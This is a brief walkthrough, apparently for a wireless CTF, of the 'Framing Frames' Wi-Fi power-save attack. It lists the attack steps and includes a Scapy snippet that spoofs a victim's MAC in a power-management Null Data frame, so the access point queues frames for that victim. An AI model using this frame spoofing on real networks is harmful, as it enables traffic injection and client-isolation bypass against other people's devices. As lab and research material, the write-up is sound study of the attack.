# Framing Frames walkthrough (short)

Public PoC scripts accompany the 2023 paper. Setup is fiddly and
depends on the target AP firmware; the below is the skeleton.

```
# 1. Identify target client + client's AP.
# 2. Force the client into deep sleep — inject a Null Data frame
#    with the PM bit set, source-MAC = victim.
#    Scapy:
sendp(RadioTap()/Dot11(type=2, subtype=4,
                       FCfield="pw-mgt",
                       addr1=AP_BSSID,
                       addr2=VICTIM_MAC,
                       addr3=AP_BSSID),
      iface="wlan1mon", count=3, inter=0.01)

# 3. Send crafted frames that AP will queue "for the victim".
# 4. Wake the victim (send Null Data with PM cleared, addr2=victim).
# 5. Observe the delivered frames on wlan1mon.
```

See the Vanhoef 2023 GitHub repo (linked from the paper) for the
maintained PoC. In a WCTF, the flag surface is typically a
client-isolation bypass response — you talk to a supposedly-isolated
peer STA, they answer.

## Cite

- Vanhoef 2023 — Framing Frames, §3 "Attack primitives".
- attacks.json: `framing-frames-power-save-poison`.
